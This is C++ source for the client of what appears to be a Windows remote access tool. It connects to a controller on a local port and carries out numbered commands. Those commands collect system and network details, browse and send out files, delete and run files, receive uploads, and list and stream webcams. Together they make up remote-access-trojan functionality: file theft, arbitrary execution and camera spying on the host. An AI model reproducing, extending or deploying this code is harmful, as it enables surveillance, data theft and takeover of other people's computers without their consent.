#include <iostream>
#include <winsock2.h>
#include "video_audio/DeviceEnumerator.h"
#include <string>
#include <filesystem>
#include "stream/Stream.h"
#include "webcam/WebcamManager.h"
#include "download/Download.h"
#include "file/FileManager.h"
#include "information/system/SystemInformation.h"
#include "information/network/NetworkInformation.h"



// new comment 2
// g++ Client.cpp  SystemInformation.cpp -o exec -lwsock32
// g++ Client.cpp  SystemInformation.cpp -o exec -lwsock32 -lwininet
// g++ Client.cpp  SystemInformation.cpp NetworkInformation.cpp -o exec
// -lwsock32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic




int main() {
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(L"877a590a-a49a-489e-af04-666f5f98d5a7"));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
        WSADATA WSAData;
        WSAStartup(MAKEWORD(2, 0), &WSAData);
        SOCKET sock;
        SOCKADDR_IN sin;
        sin.sin_addr.s_addr = inet_addr("127.0.0.1");
        sin.sin_family = AF_INET;
        sin.sin_port = htons(3055);
        sock = socket(AF_INET, SOCK_STREAM, 0);
        bool connectionState = true;
        if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
            Stream stream(sock);
            std::cout << "connection" << std::endl;
            while (connectionState) {
                int action = stream.readSize();
                switch (action) {
                    case 0: {
                        std::cout << "GATHERING SYSTEM INFORMATION" << std::endl;
                        std::vector<std::string> informationVector= SystemInformation::getSystemInformation();
                        stream.sendList(informationVector);
                        break;
                    }
                    case 1: {
                        std::cout << "GATHERING NETWORK INFORMATION " << std::endl;
                        std::string networkJSON = NetworkInformation::requestNetworkInformation();
                        stream.sendString(networkJSON.c_str());
                        break;
                    }
                    case 2: {
                        std::cout << "JSON FOR READING DISKS" << std::endl;
                        stream.sendList(SystemInformation::getDisks());
                        break;
                    }
                    case 3: {
                        std::cout << "READING ALL" << std::endl;
                        std::string path = stream.readString();
                        std::vector<std::string> folderVector = FileManager::readDirectory(std::filesystem::u8path(path), true, false);
                        std::vector<std::string> fileVector = FileManager::readDirectory(std::filesystem::u8path(path), false, true);
                        folderVector.insert(folderVector.end(),fileVector.begin(),fileVector.end());
                        stream.sendList(folderVector);
                        break;
                    }
                    case 4: {
                        std::cout << "READING ONLY DIRECTORIES" << std::endl;
                        std::string path = stream.readString();
                        std::vector<std::string> vectorOfFiles = FileManager::readDirectory(std::filesystem::u8path(path),true,false);
                        stream.sendList(vectorOfFiles);
                        break;
                    }
                    case 5: {
                        std::cout << "DOWNLOADING" << std::endl;
                        std::vector<std::string> fileList = stream.readList();
                        Download download(stream, fileList);
                        download.start();
                        break;
                    }
                    case 6: {
                        std::cout << "COPYING" << std::endl;
                        std::vector<std::string> vectorOfFiles = stream.readList();
                        std::vector<std::string> vectorOfDirectories = stream.readList();
                        FileManager::copyFiles(vectorOfFiles, vectorOfDirectories);
                        break;
                    }
                    case 7: {
                        std::cout << "MOVING" << std::endl;
                        std::vector<std::string> vectorOfFiles = stream.readList();
                        std::string directory = stream.readString();
                        FileManager::moveFiles(vectorOfFiles, directory);
                        break;
                    }
                    case 8: {
                        std::cout << "DELETING" << std::endl;
                        std::vector<std::string> vectorOfFiles = stream.readList();
                        FileManager::deleteFiles(vectorOfFiles);
                        break;
                    }
                    case 9: {
                        std::cout << "RUNNING FILES" << std::endl;
                        std::vector<std::string> vectorOfFiles = stream.readList();
                        FileManager::runFiles(vectorOfFiles);
                        break;
                    }
                    case 10: {
                        std::cout << "UPLOADING FILES" << std::endl;
                        std::vector<std::string> vectorOfFiles = stream.readList();
                        int numOfFiles = stream.readSize();

                        for (int i=0;i<numOfFiles;i++){
                            stream.readFile(vectorOfFiles);
                        }
                        break;
                    }
                    case 16: {
                        std::cout << "REQUEST DEVICES (CAMERA)" << std::endl;
                        DeviceEnumerator de;
                        std::map<int, Device> devices = de.getVideoDevicesMap();
                        std::vector<std::string> webcamVector;
                        for (auto const &device: devices) {
                            std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
                            std::cout << "Name: " << device.second.deviceName << std::endl;
                            std::cout << "Path: " << device.second.devicePath << std::endl;
                            webcamVector.push_back(device.second.deviceName);
                        }
                        stream.sendList(webcamVector);
                        break;
                    }
                    case 17: {
                        std::cout << "START WEBCAM" << std::endl;
                        std::string webcamName = stream.readString();
                        bool fragmented = stream.readSize();
                        int FPS = stream.readSize();
                        DeviceEnumerator de;

                        std::map<int, Device> devices = de.getVideoDevicesMap();
                        for (auto &device: devices) {
                            std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
                            std::cout << "Name: " << device.second.deviceName << std::endl;
                            std::cout << "Path: " << device.second.devicePath << std::endl;
                            if (device.second.deviceName == webcamName) {
                                WebcamManager webcam(stream, device.first, fragmented, FPS);
                                webcam.startWebcam();
                            }
                        }
                        break;
                    }
                    default: {
                        connectionState = false;
                        break;
                    }
                }
            }

            closesocket(sock);
        }


        WSACleanup();
    }
    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;


}
